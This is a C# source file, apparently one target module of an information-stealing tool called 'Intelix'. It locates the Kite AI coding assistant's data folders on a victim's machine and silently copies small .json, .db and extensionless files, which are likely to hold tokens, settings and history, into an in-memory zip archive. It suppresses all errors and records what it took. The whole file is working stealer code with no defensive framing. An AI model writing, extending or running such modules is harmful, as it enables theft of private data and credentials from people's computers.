using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Kite : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string[] paths = {
                Path.Combine(local, "Kite"),
                Path.Combine(userProfile, ".kite")
            };
            foreach (string dir in paths)
            {
                if (!Directory.Exists(dir)) continue;
                var entry = new Counter.CounterApplications { Name = "Kite" };
                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly))
                {
                    string ext = Path.GetExtension(file).ToLower();
                    if (ext != ".json" && ext != ".db" && ext != "") continue;
                    if (new FileInfo(file).Length > 2 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\Kite\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
                if (entry.Files.Count > 0) counter.AI.Add(entry);
            }
        }
    }
}
